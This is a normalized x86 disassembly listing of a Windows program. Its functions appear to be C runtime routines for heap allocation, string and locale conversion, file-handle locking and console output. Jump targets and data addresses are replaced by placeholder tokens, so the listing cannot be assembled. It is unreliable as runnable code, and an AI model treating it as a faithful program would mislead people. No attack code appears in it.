mov eax [ esi + 0x7c ]
test eax eax
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_40f691
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_40f691
push [ ebx ]
call sub_40f691
pop ecx
pop ecx
push [ esi + 0x78 ]
call sub_40f691
push [ esi + 0x84 ]
call sub_40f691
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_40f691
push [ esi + 0x84 ]
call sub_418958
pop ecx
pop ecx
push eax
call sub_40f691
pop ecx
push eax
call sub_40f691
push [ esi + 0x84 ]
call sub_418a54
pop ecx
pop ecx
sub_4172cb
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
mov eax esi
pop esi
pop ebp
retn
push ebx
push edi
mov edi [ InterlockedDecrement@IAT ]
push esi
call edi
cmp [ esi + 0x78 ] 0x0
je r-xdata
mov eax [ esi + 0x80 ]
test eax eax
je r-xdata
push [ esi + 0x78 ]
call edi
cmp [ esi + 0x7c ] 0x0
je r-xdata
push eax
call edi
mov eax [ esi + 0x88 ]
test eax eax
je r-xdata
push [ esi + 0x7c ]
call edi
push 0x6
pop eax
lea ebx [ esi + 0x1c ]
mov [ ebp + 0x8 ] eax
push eax
call edi
cmp [ ebx - 0xc ] 0x0
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
add ebx 0x10
dec eax
mov [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebx - 0x4 ] 0x0
je r-xdata
push [ ebx ]
call edi
mov eax [ ebp + 0x8 ]
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov ecx [ esi + 0x9c ]
add ecx 0xb0
push ecx
call edi
pop edi
pop ebx
push [ ebx - 0x4 ]
call edi
mov eax [ ebp + 0x8 ]
sub_417366
push 0xc
push r--data
call sub_411a70
call sub_414adf
mov esi eax
mov ecx [ rw-data ]
test [ esi + 0x70 ] ecx
je r-xdata
push 0xc
call sub_41569d
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
lea eax [ esi + 0x6c ]
push eax
call sub_4173e2
pop ecx
pop ecx
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4173d9
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_414adf
mov esi [ eax + 0x6c ]
mov eax esi
call sub_411ab5
retn
push 0x20
call sub_411048
sub_4173e2
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
jmp r-xdata
push edi
mov [ eax ] edi
call sub_4170e1
pop ecx
test esi esi
je r-xdata
pop edi
pop ebp
retn
push esi
call sub_4172cb
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_417171
pop ecx
sub_41742d
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_411f0f
mov eax [ ebp - 0x10 ]
movzx ecx [ ebp + 0x8 ]
mov eax [ eax + 0x90 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_417474
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
xor eax eax
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_411f0f
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_41742d
pop ecx
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
xor edi edi
inc edi
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push edi
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov edi [ ebp - 0x10 ]
cmp [ edi + 0x74 ] 0x1
jle r-xdata
xor edi edi
inc edi
jmp r-xdata
movzx eax [ esi ]
mov [ ecx ] ax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_410eb4
or edi 0xffffffff
mov [ eax ] 0x2a
cmp ebx [ edi + 0x74 ]
cmp ebx [ edi + 0x74 ]
jl r-xdata
mov eax edi
pop edi
jmp r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ esi + 0x1 ] 0x0
je r-xdata
jb r-xdata
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push [ edi + 0x74 ]
push esi
push 0x9
push [ edi + 0x4 ]
call [ MultiByteToWideChar@IAT ]
mov edi [ ebp - 0x10 ]
test eax eax
jne r-xdata
pop esi
pop ebx
leave
retn
mov edi [ edi + 0x74 ]
jmp r-xdata
sub_417580
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_417615
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_40f6c9
pop ecx
pop ebp
retn
push ebx
jmp r-xdata
push [ ebp + 0x8 ]
call sub_40f691
pop ecx
xor eax eax
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
pop esi
pop ebp
retn
test esi esi
jne r-xdata
push esi
call sub_410f1d
pop ecx
call sub_410eb4
mov [ eax ] 0xc
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
inc esi
mov eax ebx
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
pop ebx
call sub_410eb4
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_410ec7
pop ecx
mov [ esi ] eax
push esi
call sub_410f1d
pop ecx
test eax eax
je r-xdata
call sub_410eb4
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_410ec7
pop ecx
mov [ esi ] eax
jmp r-xdata
xor eax eax
sub_4176c0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
imul esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div esi
cmp eax [ ebp + 0xc ]
jae r-xdata
xor ecx ecx
cmp esi 0xffffffe0
ja r-xdata
inc esi
call sub_410eb4
cmp [ rw-data ] 0x0
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov ecx eax
test ecx ecx
jne r-xdata
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
push esi
call sub_410f1d
pop ecx
test eax eax
jne r-xdata
mov eax ecx
mov [ eax ] 0xc
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
mov [ eax ] 0xc
sub_417802
push 0x8
push r--data
call sub_411a70
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
add eax 0xc
add eax edi
push eax
call [ EnterCriticalSection@IAT ]
xor eax eax
inc eax
call sub_411ab5
retn
push 0xa
call sub_41569d
pop ecx
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417885
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
inc [ esi + 0x8 ]
sub_41788e
push 0x18
push r--data
call sub_411a70
or esi 0xffffffff
mov [ ebp - 0x1c ] esi
and [ ebp - 0x24 ] 0x0
push 0xb
call sub_415725
pop ecx
test eax eax
jne r-xdata
push 0xb
call sub_41569d
pop ecx
and [ ebp - 0x4 ] 0x0
xor ebx ebx
or eax esi
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417a2a
mov eax esi
mov edi [ ebx * 4 + rw-data ]
test edi edi
je r-xdata
call sub_411ab5
retn
push 0x40
push 0x20
call sub_411fca
pop ecx
pop ecx
mov ecx eax
mov [ ebp - 0x20 ] ecx
test ecx ecx
je r-xdata
mov [ ebp - 0x20 ] edi
mov eax [ ebx * 4 + rw-data ]
add eax 0x800
cmp edi eax
jae r-xdata
mov [ ebx * 4 + rw-data ] ecx
add [ rw-data ] 0x20
cmp esi 0xffffffff
jne r-xdata
test [ edi + 0x4 ] 0x1
jne r-xdata
mov esi ebx
shl esi 0x5
mov [ ebp - 0x1c ] esi
mov eax esi
sar eax 0x5
mov ecx esi
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
mov [ eax + ecx + 0x4 ] 0x1
push esi
call sub_417802
pop ecx
test eax eax
jne r-xdata
mov [ ecx + 0x4 ] 0xa00
or [ ecx ] 0xffffffff
and [ ecx + 0x8 ] 0x0
add ecx 0x40
mov [ ebp - 0x20 ] ecx
jmp r-xdata
inc ebx
jmp r-xdata
add edi 0x40
jmp r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
or esi 0xffffffff
mov [ ebp - 0x1c ] esi
mov eax [ ebx * 4 + rw-data ]
add eax 0x800
cmp ecx eax
jae r-xdata
mov [ ebp - 0x28 ] ebx
cmp ebx 0x40
jge r-xdata
mov eax [ ebp - 0x24 ]
test eax eax
jne r-xdata
push 0xa
call sub_41569d
pop ecx
mov [ ebp - 0x4 ] 0x1
cmp [ edi + 0x8 ] 0x0
jne r-xdata
lea eax [ edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
test [ edi + 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_417962
push 0xfa0
lea eax [ edi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
inc [ edi + 0x8 ]
mov eax [ ebp - 0x24 ]
test eax eax
jne r-xdata
lea eax [ edi + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
mov [ edi + 0x4 ] 0x1
or [ edi ] 0xffffffff
mov esi edi
sub esi [ ebx * 4 + rw-data ]
sar esi 0x6
mov eax ebx
shl eax 0x5
add esi eax
mov [ ebp - 0x1c ] esi
sub_417a33
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
test eax eax
js r-xdata
call sub_410eb4
mov [ eax ] 0x9
call sub_410e80
and [ eax ] 0x0
or eax 0xffffffff
cmp eax [ rw-data ]
jae r-xdata
mov edi eax
sar edi 0x5
mov esi eax
mov ecx [ edi * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
test [ esi + ecx + 0x4 ] 0x1
je r-xdata
cmp [ esi + ecx ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi * 4 + rw-data ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
xor ecx ecx
sub eax ecx
je r-xdata
pop edi
pop esi
pop ebp
retn
push ecx
push 0xfffffff6
dec eax
je r-xdata
push ecx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ecx
push 0xfffffff4
jmp r-xdata
sub_417ab9
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_410e80
and [ eax ] 0x0
call sub_410eb4
mov [ eax ] 0x9
jmp r-xdata
call sub_410e80
and [ eax ] 0x0
call sub_410eb4
mov [ eax ] 0x9
call sub_41179e
cmp ecx [ rw-data ]
jae r-xdata
or eax 0xffffffff
pop ebp
retn
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
test [ eax + ecx + 0x4 ] 0x1
je r-xdata
mov eax [ eax + ecx ]
pop ebp
retn
sub_417b20
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
push edi
test ecx ecx
js r-xdata
call sub_410eb4
mov [ eax ] 0x9
call sub_410e80
and [ eax ] 0x0
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov ebx ecx
sar ebx 0x5
mov edi ecx
mov eax [ ebx * 4 + rw-data ]
and edi 0x1f
shl edi 0x6
cmp [ edi + eax ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push esi
mov esi [ ebp + 0xc ]
jne r-xdata
mov eax [ ebx * 4 + rw-data ]
mov [ edi + eax ] esi
xor eax eax
pop esi
jmp r-xdata
sub ecx 0x0
je r-xdata
pop edi
pop ebx
pop ebp
retn
push esi
push 0xfffffff6
dec ecx
je r-xdata
push esi
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push esi
push 0xfffffff4
jmp r-xdata
sub_417ba2
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax ecx
and ecx 0x1f
sar eax 0x5
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
add ecx 0xc
add eax ecx
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_417bc8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_40f691
pop ecx
sub_417be6
push ebp
mov ebp esp
push ebx
push esi
push edi
xor edi edi
mov ebx 0xe3
mov eax [ esi * 8 + r--data ]
jns r-xdata
lea edi [ esi + 0x1 ]
lea ebx [ esi - 0x1 ]
jmp r-xdata
lea eax [ ebx + edi ]
cdq
sub eax edx
mov esi eax
sar esi 0x1
push 0x55
push [ esi * 8 + r--data ]
push [ ebp + 0x8 ]
call sub_417caa
add esp 0xc
test eax eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
cmp edi ebx
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_417c34
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call sub_417be6
pop ecx
test eax eax
js r-xdata
cmp eax 0xe4
jae r-xdata
mov eax [ eax * 8 + r--data ]
pop ebp
retn
sub_417c5e
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_417c34
pop ecx
push eax
call [ LCMapStringW@IAT ]
pop ebp
retn
xor ecx ecx
push ecx
push ecx
push ecx
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_417caa
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x10 ]
xor eax eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ ebp + 0xc ]
push ebx
push edi
mov edi [ ebp + 0x8 ]
push 0x41
pop ebx
push 0x5a
pop edx
sub edi ecx
mov [ ebp + 0x10 ] edx
jmp r-xdata
movzx eax [ edi + ecx ]
cmp ax bx
jb r-xdata
mov edx eax
cmp ax dx
ja r-xdata
add ecx 0x2
dec esi
je r-xdata
cmp ax [ ebp + 0x10 ]
ja r-xdata
add eax 0x20
movzx edx ax
jmp r-xdata
movzx ecx ax
movzx eax dx
pop edi
sub eax ecx
pop ebx
test dx dx
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp ax bx
jb r-xdata
cmp dx ax
je r-xdata
push 0x5a
pop edx
sub_417d18
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
call sub_418e83
mov eax [ rw-data ]
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
leave
retn
mov ax [ ebp + 0x8 ]
leave
retn
sub_417d59
push 0x14
push r--data
call sub_411a70
mov edi [ ebp + 0x8 ]
cmp edi 0xfffffffe
jne r-xdata
test edi edi
js r-xdata
call sub_410eb4
mov [ eax ] 0x9
jmp r-xdata
call sub_410eb4
mov [ eax ] 0x9
call sub_41179e
cmp edi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov eax edi
sar eax 0x5
mov [ ebp - 0x20 ] eax
mov ebx edi
and ebx 0x1f
shl ebx 0x6
mov eax [ eax * 4 + rw-data ]
movsx eax [ ebx + eax + 0x4 ]
and eax 0x1
je r-xdata
push edi
call sub_417802
pop ecx
xor esi esi
mov [ ebp - 0x4 ] esi
mov eax [ ebp - 0x20 ]
mov eax [ eax * 4 + rw-data ]
test [ ebx + eax + 0x4 ] 0x1
je r-xdata
call sub_410eb4
mov [ eax ] 0x9
or esi 0xffffffff
mov [ ebp - 0x1c ] esi
push edi
call sub_417ab9
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
call sub_411ab5
retn
mov [ ebp - 0x1c ] esi
test esi esi
je r-xdata
call [ GetLastError@IAT ]
mov esi eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417e1e
mov eax esi
jmp r-xdata
call sub_410e80
mov [ eax ] esi
sub_417e40
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_417e74
push 0x8
push r--data
call sub_411a70
mov esi rw-data
cmp [ rw-data ] esi
je r-xdata
call sub_411ab5
retn
push 0xc
call sub_41569d
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
push rw-data
call sub_4173e2
pop ecx
pop ecx
mov [ rw-data ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417ebd
sub_417ec6
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_410eb4
push 0x16
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
push edi
mov edi esi
sub edi ecx
mov [ esi ] cl
pop edi
test edx edx
jne r-xdata
dec edx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ esi ] dl
call sub_410eb4
push 0x22
jmp r-xdata
mov al [ ecx ]
mov [ edi + ecx ] al
inc ecx
test al al
je r-xdata
pop esi
pop ebp
retn
pop esi
mov [ eax ] esi
call sub_41179e
mov eax esi
sub_417f1b
push 0x14
push r--data
call sub_411a70
and [ ebp - 0x1c ] 0x0
xor eax eax
mov esi [ ebp + 0x18 ]
test esi esi
setne al
test eax eax
jne r-xdata
or [ esi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
test eax eax
je r-xdata
call sub_410eb4
push 0x16
pop esi
mov [ eax ] esi
call sub_41179e
mov eax esi
jmp r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
call sub_411ab5
retn
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push esi
lea eax [ ebp - 0x1c ]
push eax
call sub_417fe2
add esp 0x1c
mov edi eax
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417fb6
test edi edi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
inc eax
je r-xdata
mov eax edi
or [ esi ] 0xffffffff
sub_417fb6
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
test edi edi
je r-xdata
push [ esi ]
call sub_417ba2
pop ecx
mov ecx [ esi ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
and [ eax + ecx + 0x4 ] 0xfe
sub_417fe2
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x10 ]
call sub_410f50
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp - 0x4 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4167b2
push [ ebp - 0x4 ]
mov esi eax
call sub_40f691
add esp 0x20
mov eax esi
pop esi
leave
retn
or eax 0xffffffff
leave
retn
sub_418064
push ebp
mov ebp esp
sub esp 0x14
push esi
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
push ebx
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x14 ]
call sub_411f0f
mov eax [ ebp - 0x10 ]
xor edx edx
cmp [ eax + 0x8 ] edx
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ ebp + 0x8 ]
test ebx ebx
je r-xdata
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41a620
add esp 0xc
mov edx eax
jmp r-xdata
pop esi
leave
retn
call sub_410eb4
mov [ eax ] 0x16
call sub_41179e
mov edx 0x7fffffff
jmp r-xdata
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
pop edi
pop ebx
je r-xdata
movzx ecx [ ebx ]
mov edx [ ebp - 0x10 ]
dec esi
mov eax ecx
inc ebx
test [ eax + edx + 0x19 ] 0x4
push 0x0
mov [ ebp - 0x4 ] ebx
pop edx
je r-xdata
mov eax edx
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
movzx ebx [ edi ]
mov edx [ ebp - 0x10 ]
mov eax ebx
inc edi
test [ eax + edx + 0x19 ] 0x4
push 0x0
pop edx
je r-xdata
test esi esi
jne r-xdata
cmp bx cx
jne r-xdata
test esi esi
jne r-xdata
mov al [ ebx ]
test al al
jne r-xdata
movzx eax [ edi ]
mov ebx [ ebp - 0x10 ]
mov ecx edx
test [ eax + ebx + 0x19 ] 0x4
jne r-xdata
sbb edx edx
and edx 0x2
dec edx
test cx cx
je r-xdata
mov al [ edi ]
dec esi
test al al
je r-xdata
mov ebx edx
jmp r-xdata
shl ecx 0x8
movzx eax al
or cx ax
inc ebx
movzx ecx cx
mov [ ebp - 0x4 ] ebx
mov ecx edx
jmp r-xdata
mov al [ edi ]
movzx ebx al
jmp r-xdata
mov ebx [ ebp - 0x4 ]
test esi esi
jne r-xdata
shl ebx 0x8
movzx eax al
or bx ax
movzx ebx bx
inc edi
jmp r-xdata
sub_418191
push ebp
mov ebp esp
sub esp 0x18
lea ecx [ ebp - 0x18 ]
push ebx
push esi
push edi
push [ ebp + 0x14 ]
call sub_411f0f
mov edi [ ebp + 0x10 ]
xor edx edx
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
mov ecx [ ebp - 0x14 ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax edx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41a698
add esp 0xc
mov edx eax
jmp r-xdata
call sub_410eb4
mov [ eax ] 0x16
call sub_41179e
mov edx 0x7fffffff
jmp r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
jne r-xdata
movzx eax [ esi ]
mov [ ebp + 0x10 ] eax
mov [ ebp - 0x4 ] eax
movzx eax al
dec edi
inc esi
test [ eax + ecx + 0x19 ] 0x4
mov [ ebp - 0x8 ] esi
je r-xdata
mov si [ ebp - 0x4 ]
movzx eax si
test [ eax + ecx + 0x19 ] 0x10
je r-xdata
test edi edi
jne r-xdata
movzx eax [ ebx ]
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x10 ] eax
movzx eax al
inc ebx
test [ eax + ecx + 0x19 ] 0x4
je r-xdata
movzx eax [ eax + ecx + 0x119 ]
mov [ ebp - 0x4 ] eax
mov al [ esi ]
test al al
jne r-xdata
movzx eax [ ebx ]
mov [ ebp - 0x4 ] edx
test [ eax + ecx + 0x19 ] 0x4
jne r-xdata
mov ax [ ebp + 0x10 ]
movzx edx ax
push 0x0
test [ edx + ecx + 0x19 ] 0x10
mov [ ebp + 0x10 ] edx
pop edx
je r-xdata
test edi edi
jne r-xdata
shl [ ebp + 0x10 ] 0x8
movzx eax al
or [ ebp + 0x10 ] ax
mov eax [ ebp + 0x10 ]
movzx eax ax
inc esi
mov [ ebp - 0x8 ] esi
mov si ax
mov [ ebp - 0x4 ] eax
cmp si [ ecx + 0xc ]
jb r-xdata
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov al [ ebx ]
movzx eax al
mov si dx
jmp r-xdata
cmp ax si
jne r-xdata
mov eax [ ebp + 0x10 ]
movzx eax [ eax + ecx + 0x119 ]
mov al [ ebx ]
dec edi
test al al
je r-xdata
mov [ ebp + 0x10 ] edx
jmp r-xdata
cmp si [ ecx + 0x12 ]
jb r-xdata
cmp si [ ecx + 0xe ]
ja r-xdata
mov si [ ebp - 0x4 ]
mov [ ebp + 0x10 ] eax
sbb edx edx
and edx 0x2
dec edx
test si si
je r-xdata
shl [ ebp - 0x4 ] 0x8
movzx eax al
or [ ebp - 0x4 ] ax
mov eax [ ebp - 0x4 ]
movzx eax ax
inc ebx
mov [ ebp + 0x10 ] eax
cmp ax [ ecx + 0xc ]
jb r-xdata
mov ax [ ebp + 0x10 ]
cmp si [ ecx + 0x14 ]
ja r-xdata
add si [ ecx + 0x10 ]
jmp r-xdata
mov esi [ ebp - 0x8 ]
test edi edi
jne r-xdata
cmp ax [ ecx + 0x12 ]
jb r-xdata
cmp ax [ ecx + 0xe ]
ja r-xdata
add si [ ecx + 0x16 ]
jmp r-xdata
jmp r-xdata
cmp ax [ ecx + 0x14 ]
ja r-xdata
add ax [ ecx + 0x10 ]
jmp r-xdata
add ax [ ecx + 0x16 ]
jmp r-xdata
sub_418356
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x18 ]
push edi
test esi esi
jle r-xdata
mov ecx [ ebp + 0x24 ]
xor edi edi
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx esi
xor eax eax
cmp [ ebp + 0x28 ] eax
push 0x0
setne al
push 0x0
push esi
push [ ebp + 0x14 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push ecx
call [ MultiByteToWideChar@IAT ]
mov ecx eax
mov [ ebp - 0x8 ] ecx
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x24 ] eax
mov ecx eax
mov eax esi
sub eax ecx
dec eax
cmp eax esi
lea esi [ eax + 0x1 ]
jl r-xdata
inc eax
test ecx ecx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov esi eax
dec ecx
cmp [ eax ] 0x0
je r-xdata
or ecx 0xffffffff
xor ebx ebx
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
leave
retn
